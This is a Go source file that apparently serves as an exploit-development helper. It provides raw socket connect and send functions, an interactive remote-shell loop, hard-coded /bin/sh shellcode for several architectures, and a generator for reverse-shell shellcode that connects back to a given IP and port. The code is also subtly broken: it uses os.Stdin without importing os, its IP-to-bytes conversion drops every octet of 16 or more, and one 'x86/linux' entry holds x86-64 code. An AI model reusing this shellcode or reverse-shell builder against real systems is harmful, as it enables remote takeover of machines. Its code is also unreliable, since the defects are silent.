package ssocket

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
)

// SecuritySocket .
type SecuritySocket struct {
	Protocol string
	Host     string
}

// Connect .
func (ss SecuritySocket) Connect() net.Conn {
	conn, _ := net.Dial(ss.Protocol, ss.Host)
	return conn
}

// Send .
func (ss SecuritySocket) Send(conn net.Conn, payload string) {
	fmt.Fprintf(conn, payload)
}

// Interactive .
func (ss SecuritySocket) Interactive(conn net.Conn) {
	bufRead := make([]byte, 1024)
	conn.Read(bufRead)
	fmt.Fprint(conn, "\n")
	for {
		bufRead = make([]byte, 1024)
		conn.Read(bufRead)
		fmt.Print(string(bufRead))
		fmt.Print(">> ")
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		fmt.Fprintln(conn, input)
	}
}

// GetShellcode .
func (ss SecuritySocket) GetShellcode(arch string) string {
	shellcode := ""
	if arch == "x86/linux" {
		shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
	} //24 bytes
	if arch == "x86/bsd" {
		shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x50\x53\x50\x6a\x3b\x58\xcd\x80"
	} //24 bytes
	if arch == "x86-64/linux" {
		shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
	} //27 bytes
	if arch == "x86/linux/poly" {
		shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
	} //24 bytes
	if arch == "arm" {
		shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
	}

	return shellcode
}

// GetReverseShell .
func (ss SecuritySocket) GetReverseShell(arch string, ip string, port uint32) string {
	shellcode := ""
	IPADDR := ss.ip2hex(ip)
	PORT := new(bytes.Buffer)
	binary.Write(PORT, binary.BigEndian, &port)

	if arch == "x86-64/linux" { //118 bytes
		shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
		shellcode += "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
		shellcode += "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
		shellcode += "\x02" + string(PORT.Bytes()) + "\xc7\x44\x24\x04" + IPADDR + "\x48\x89\xe6\x6a\x10"
		shellcode += "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
		shellcode += "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
		shellcode += "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
		shellcode += "\x5f\x6a\x3b\x58\x0f\x05"
	}
	if arch == "x86/linux" { //74 bytes
		shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68"
		shellcode += IPADDR + "\x66\x68" + string(PORT.Bytes()) + "\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59"
		shellcode += "\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68"
		shellcode += "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
	}

	return shellcode
}

func (ss SecuritySocket) ip2hex(ip string) string {
	ipParts := strings.Split(ip, ".")
	ipNew := ""
	for _, part := range ipParts {
		value, _ := strconv.Atoi(part)
		hex := fmt.Sprintf("\\x%x", value)
		ipNew += ss.hexFixer(hex)
	}
	return ipNew
}

func (ss SecuritySocket) hexFixer(x string) string {
	result := make(map[string]string)
	result["\\x0"] = "\x00"
	result["\\x1"] = "\x01"
	result["\\x2"] = "\x02"
	result["\\x3"] = "\x03"
	result["\\x4"] = "\x04"
	result["\\x5"] = "\x05"
	result["\\x6"] = "\x06"
	result["\\x7"] = "\x07"
	result["\\x8"] = "\x08"
	result["\\x9"] = "\x09"

	return result[x]
}
